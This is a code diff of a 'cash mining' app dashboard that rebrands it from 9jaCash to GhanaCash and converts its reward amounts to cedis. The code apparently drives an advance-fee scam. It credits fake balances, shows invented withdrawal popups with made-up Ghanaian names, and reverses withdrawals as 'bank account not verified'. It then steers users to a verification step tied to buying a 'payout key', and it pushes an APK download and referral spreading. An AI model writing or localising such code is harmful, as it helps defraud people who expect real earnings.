@@ -16,15 +16,15 @@ function formatExternalLink(url, defaultUrl) {
 }
 
 let isBouncing = false;
-try { userData = JSON.parse(localStorage.getItem("9jaCashUser")); } catch (e) { userData = null; }
+try { userData = JSON.parse(localStorage.getItem("GhanaCashUser")); } catch (e) { userData = null; }
 const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:') ? 'http://localhost:3000' : '';
 if (!userData) { window.location.href = "login.html"; }
 
 let balance = (userData ? parseFloat(userData.balance) : 0) || parseFloat(localStorage.getItem("walletBalance")) || 0;
 let balanceHidden = false;
-const CHECKIN_REWARDS = [500, 1000, 1500, 2000, 3000, 5000, 10000];
+const CHECKIN_REWARDS = [4.17, 8.33, 12.5, 16.67, 25, 41.67, 83.33];
 let checkinData = JSON.parse(localStorage.getItem("checkinData")) || { streak: 0, lastCheckin: null, claimedDays: [] };
-const CLAIM_AMOUNT = 2000;
+const CLAIM_AMOUNT = 16.67;
 const CLAIM_INTERVAL = 60;
 const MAX_CLAIMS_PER_DAY = 50;
 let claimData = JSON.parse(localStorage.getItem("claimData")) || { count: 0, lastClaim: 0, dateStr: "", claimsToday: 0 };
@@ -33,12 +33,12 @@ let secondsLeft = CLAIM_INTERVAL;
 let telegramLink = "https://t.me/apex_customercare";
 
 const TUTORIAL_STEPS = [
-  { id: "mineBtn", title: "Start Mining", desc: "Tap the Mine button to earn your first ₵30,000. Mining runs daily!", position: "bottom" },
+  { id: "mineBtn", title: "Start Mining", desc: "Tap the Mine button to earn your first ₵250. Mining runs daily!", position: "bottom" },
   { id: "withdrawBtn", title: "Withdraw Cash", desc: "Tap Withdraw to cash out your earnings to your linked bank account.", position: "bottom" },
   { id: "tasksBtn", title: "Complete Tasks", desc: "Visit the Tasks page to earn extra cash by completing simple social media tasks.", position: "bottom" },
   { id: "eyeBtn", title: "Hide Balance", desc: "Tap the eye icon anytime to hide or show your balance for privacy.", position: "bottom" },
-  { id: "claimArea", title: "Claim Every Minute", desc: "Tap Claim every 60 seconds to collect ₵2,000 free cash! Up to 50 times daily.", position: "top" },
-  { id: "checkinBtn", title: "Daily Check-In", desc: "Check in every day to collect increasing rewards: 500, 1K, 1.5K, 2K, 3K, 5K, 10K!", position: "top" }
+  { id: "claimArea", title: "Claim Every Minute", desc: "Tap Claim every 60 seconds to collect ₵16.67 free cash! Up to 50 times daily.", position: "top" },
+  { id: "checkinBtn", title: "Daily Check-In", desc: "Check in every day to collect increasing rewards: 4.17, 8.33, 12.5, 16.67, 25, 41.67, 83.33!", position: "top" }
 ];
 let currentTutorialStep = 0;
 let tutorialActive = false;
@@ -81,7 +81,7 @@ function setupRealtimeListener() {
         balance = parseFloat(liveData.balance);
       }
 
-      localStorage.setItem("9jaCashUser", JSON.stringify(userData));
+      localStorage.setItem("GhanaCashUser", JSON.stringify(userData));
       localStorage.setItem("walletBalance", balance);
 
       if (liveData.streak !== undefined) checkinData.streak = liveData.streak;
@@ -104,7 +104,7 @@ function setupRealtimeListener() {
 
 // REAL-TIME SAVE TO FIREBASE & LOCAL STORAGE
 function saveUserData(updatedFields = {}) {
-  localStorage.setItem("9jaCashUser", JSON.stringify(userData));
+  localStorage.setItem("GhanaCashUser", JSON.stringify(userData));
   localStorage.setItem("walletBalance", balance);
   updateBalance();
 
@@ -145,12 +145,12 @@ function saveUserData(updatedFields = {}) {
 // Social popup handles come from Firestore settings/payment (telegramLink, whatsappLink)
 let paymentHandles = { telegram: "", whatsapp: "" };
 try {
-  const cachedPayment = JSON.parse(localStorage.getItem("9jaCashAdminConfig"));
+  const cachedPayment = JSON.parse(localStorage.getItem("GhanaCashAdminConfig"));
   if (cachedPayment) paymentHandles = { telegram: cachedPayment.telegramLink || "", whatsapp: cachedPayment.whatsappLink || "" };
 } catch (e) { }
 
 function loadTelegramConfig() {
-  const stored = localStorage.getItem("9jaCashAdminConfig");
+  const stored = localStorage.getItem("GhanaCashAdminConfig");
   if (stored) { try { const config = JSON.parse(stored); if (config.telegramLink) telegramLink = config.telegramLink; } catch (e) { } }
   if (db) {
     db.collection("settings").doc("payment").onSnapshot(function (doc) {
@@ -158,7 +158,7 @@ function loadTelegramConfig() {
         const d = doc.data() || {};
         if (d.telegramLink) telegramLink = d.telegramLink;
         paymentHandles = { telegram: d.telegramLink || "", whatsapp: d.whatsappLink || "" };
-        localStorage.setItem("9jaCashAdminConfig", JSON.stringify({ telegramLink: telegramLink, whatsappLink: paymentHandles.whatsapp }));
+        localStorage.setItem("GhanaCashAdminConfig", JSON.stringify({ telegramLink: telegramLink, whatsappLink: paymentHandles.whatsapp }));
         updateTelegramLink();
         // If the popup is already visible, refresh its link
         const p = document.getElementById("socialJoinPopup");
@@ -175,17 +175,17 @@ function updateTelegramLink() {
 }
 
 function initDarkMode() {
-  const isDark = localStorage.getItem("9jaCashDark") === "true";
+  const isDark = localStorage.getItem("GhanaCashDark") === "true";
   if (isDark) document.body.classList.add("dark-mode");
 }
 
 function toggleDarkMode() {
   const isDark = document.body.classList.toggle("dark-mode");
-  localStorage.setItem("9jaCashDark", isDark);
+  localStorage.setItem("GhanaCashDark", isDark);
 }
 
 function initTutorial() {
-  if (localStorage.getItem("9jaCashTutorialDone") === "true") return;
+  if (localStorage.getItem("GhanaCashTutorialDone") === "true") return;
   setTimeout(function () { startTutorial(); }, 1500);
 }
 
@@ -259,7 +259,7 @@ function finishTutorial() {
   if (skipBtn) skipBtn.classList.remove("show");
   const startBtn = document.getElementById("startTourBtn");
   if (startBtn) startBtn.style.display = "flex";
-  localStorage.setItem("9jaCashTutorialDone", "true");
+  localStorage.setItem("GhanaCashTutorialDone", "true");
   showToast("Tour complete! Start earning!");
 }
 
@@ -282,7 +282,7 @@ function executeBounce() {
     addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
     sendBounceNotification(amount);
 
-    localStorage.setItem("9jaCashBouncedWithdrawal", "true");
+    localStorage.setItem("GhanaCashBouncedWithdrawal", "true");
     checkAndShowVerifyButton();
 
     if (typeof Swal !== 'undefined') {
@@ -359,7 +359,7 @@ function renderUserInfo() {
   const avatarEl = document.getElementById("userAvatar");
   const greetingEl = document.getElementById("greeting");
 
-  if (nameEl) nameEl.textContent = userData.name || userData.phone || "9jaCash User";
+  if (nameEl) nameEl.textContent = userData.name || userData.phone || "GhanaCash User";
   if (avatarEl) avatarEl.textContent = (userData.name || userData.phone || "9").charAt(0).toUpperCase();
 
   const hrs = new Date().getHours();
@@ -424,7 +424,7 @@ function doCheckin() {
 }
 
 function startMining() {
-  const minedAmount = 30000;
+  const minedAmount = 250;
   balance += minedAmount;
   userData.balance = balance;
   userData.totalMined = (userData.totalMined || 0) + minedAmount;
@@ -570,7 +570,7 @@ function renderBankInfo() {
 function checkAndShowVerifyButton() {
   const wrap = document.getElementById("verifyBankWrap");
   if (!wrap) return;
-  const isBounced = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
+  const isBounced = localStorage.getItem("GhanaCashBouncedWithdrawal") === "true";
   const hasPayoutKey = userData && userData.payoutKeyPurchased === true;
   const isVerified = userData && (userData.is_verified === 1 || userData.is_verified === true || userData.isVerified === true);
 
@@ -604,7 +604,7 @@ function proceedToVerify() {
 function verifyBankLink() { window.location.href = "verify.html"; }
 
 function initReferrals() {
-  const code = userData ? (userData.referralCode || userData.phone || "9JACASH") : "9JACASH";
+  const code = userData ? (userData.referralCode || userData.phone || "GHANACASH") : "GHANACASH";
   const baseUrl = window.location.origin + window.location.pathname.replace("dashboard.html", "") + "start.html?ref=" + code;
 
   const input = document.getElementById("referralLinkInput");
@@ -615,7 +615,7 @@ function initReferrals() {
   if (countEl) countEl.textContent = userData.referralsCount || userData.referrals || 0;
   if (earnEl) earnEl.textContent = formatMoney(userData.referralEarnings || 0);
 
-  const msg = encodeURIComponent("Join me on 9jaCash to earn daily cash! Register here: " + baseUrl);
+  const msg = encodeURIComponent("Join me on GhanaCash to earn daily cash! Register here: " + baseUrl);
   const shareTg = document.getElementById("shareTelegram");
   if (shareTg) shareTg.href = "https://t.me/share/url?url=" + encodeURIComponent(baseUrl) + "&text=" + msg;
   const shareWa = document.getElementById("shareWhatsApp");
@@ -632,8 +632,8 @@ function copyReferralLink() {
 
 function copyReferralMessage() {
   const input = document.getElementById("referralLinkInput");
-  const code = userData ? (userData.referralCode || userData.phone || "9JACASH") : "9JACASH";
-  const msg = "Join 9jaCash today & earn daily cash!\nUse referral code: " + code + "\nLink: " + (input ? input.value : "");
+  const code = userData ? (userData.referralCode || userData.phone || "GHANACASH") : "GHANACASH";
+  const msg = "Join GhanaCash today & earn daily cash!\nUse referral code: " + code + "\nLink: " + (input ? input.value : "");
   navigator.clipboard.writeText(msg).then(() => showToast("Referral details copied!"));
 }
 
@@ -688,7 +688,7 @@ function renderActivities() {
 function logout() {
   if (confirm("Are you sure you want to log out?")) {
     if (realtimeUnsubscribe) realtimeUnsubscribe();
-    localStorage.removeItem("9jaCashUser");
+    localStorage.removeItem("GhanaCashUser");
     localStorage.removeItem("walletBalance");
     window.location.href = "login.html";
   }
@@ -724,7 +724,7 @@ function dismissDownloadPrompt() {
   if (banner) banner.classList.remove("show");
 }
 
-const APK_URL = "https://raw.githubusercontent.com/Xantech007/9jaCashMine/main/9jaCash.apk";
+const APK_URL = "https://raw.githubusercontent.com/Xantech007/GhanaCashMine/main/GhanaCash.apk";
 
 function downloadAppAPK() {
   showToast("Downloading APK...");
@@ -736,7 +736,7 @@ function downloadAppAPK() {
 // ---- Customer Care modal: handles come from Firestore settings/redirects ----
 let socialHandles = { telegram: "", whatsapp: "" };
 try {
-  const cached = JSON.parse(localStorage.getItem("9jaCashSocialHandles"));
+  const cached = JSON.parse(localStorage.getItem("GhanaCashSocialHandles"));
   if (cached) socialHandles = { telegram: cached.telegram || "", whatsapp: cached.whatsapp || "" };
 } catch (e) { }
 
@@ -761,7 +761,7 @@ function updateCustomerCareLinks() {
   const waUrl = buildWhatsappUrl(socialHandles.whatsapp);
   if (tg && tgUrl) tg.href = tgUrl;
   if (wa && waUrl) {
-    wa.href = waUrl + (waUrl.indexOf("?") === -1 ? "?text=" + encodeURIComponent("Hello 9jaCash Support, I need assistance") : "");
+    wa.href = waUrl + (waUrl.indexOf("?") === -1 ? "?text=" + encodeURIComponent("Hello GhanaCash Support, I need assistance") : "");
   }
 }
 
@@ -774,7 +774,7 @@ function loadSocialHandles() {
       telegram: d.failedSupportHandle || "",
       whatsapp: d.whatsappHandle || ""
     };
-    try { localStorage.setItem("9jaCashSocialHandles", JSON.stringify(socialHandles)); } catch (e) { }
+    try { localStorage.setItem("GhanaCashSocialHandles", JSON.stringify(socialHandles)); } catch (e) { }
     updateCustomerCareLinks();
   }, function (err) { });
 }
@@ -832,9 +832,9 @@ function dismissSocialPopup() {
 function initSocialPopup() {
   // Alternate platform each page load
   let last = "whatsapp";
-  try { last = localStorage.getItem("9jaCashLastSocial") || "whatsapp"; } catch (e) { }
+  try { last = localStorage.getItem("GhanaCashLastSocial") || "whatsapp"; } catch (e) { }
   window.__socialPlatform = last === "telegram" ? "whatsapp" : "telegram";
-  try { localStorage.setItem("9jaCashLastSocial", window.__socialPlatform); } catch (e) { }
+  try { localStorage.setItem("GhanaCashLastSocial", window.__socialPlatform); } catch (e) { }
 
   updateCustomerCareLinks(); // apply cached handles immediately
   loadSocialHandles();
@@ -843,8 +843,8 @@ function initSocialPopup() {
 }
 
 function startLiveWithdrawalPopups() {
-  const users = ["Musa B.", "Chidi O.", "Amina Y.", "Efe P.", "Blessing K."];
-  const amounts = [15000, 25000, 30000, 50000, 20000];
+  const users = ["Kwame B.", "Kofi O.", "Ama Y.", "Yaw P.", "Akosua K."];
+  const amounts = [125, 208.33, 250, 416.67, 166.67];
 
   setInterval(() => {
     const popup = document.getElementById("liveWithdrawalPopup");
@@ -890,7 +890,7 @@ document.addEventListener("DOMContentLoaded", function () {
 let userNotifications = [
   {
     id: 1,
-    title: "Welcome to 9jaCash!",
+    title: "Welcome to GhanaCash!",
     desc: "Start mining daily to earn rewards and build up your balance.",
     time: "2 mins ago",
     read: false
